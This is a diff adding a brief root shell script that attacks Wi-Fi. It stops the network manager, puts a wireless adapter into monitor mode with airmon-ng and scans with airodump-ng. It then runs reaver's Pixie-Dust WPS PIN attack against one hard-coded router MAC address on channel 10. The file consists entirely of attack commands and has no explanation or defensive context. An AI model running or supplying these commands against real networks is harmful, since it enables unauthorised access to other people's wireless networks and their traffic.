@@ -1,0 +1,12 @@
+# run with sudo
+service network-manager stop
+airmon-ng check
+airmon-ng check
+airmon-ng check kill
+airmon-ng check
+iwconfig
+airmon-ng start wlx000f00ad3dc9
+iwconfig
+airmon-ng start wlan0mon
+airodump-ng wlan0mon
+reaver -i wlan0mon -b B0:95:75:1D:01:F4 -c 10 -K 1 -vv
